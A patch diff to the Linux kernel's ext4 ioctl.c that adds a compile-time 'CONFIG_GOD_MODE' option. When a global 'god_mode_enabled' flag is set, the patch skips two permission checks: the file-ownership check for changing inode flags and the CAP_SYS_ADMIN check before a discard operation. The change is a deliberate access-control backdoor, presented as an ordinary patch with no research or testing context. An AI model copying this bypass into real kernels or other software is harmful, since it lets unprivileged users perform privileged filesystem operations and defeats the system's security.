@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * linux/fs/ext4/ioctl.c
  *
@@ -153,7 +156,15 @@ flags_out:
 		int err;
 
 		if (!inode_owner_or_capable(inode))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		err = mnt_want_write(filp->f_path.mnt);
 		if (err)
@@ -343,7 +354,15 @@ mext_out:
 		int ret = 0;
 
 		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		if (!blk_queue_discard(q))
 			return -EOPNOTSUPP;
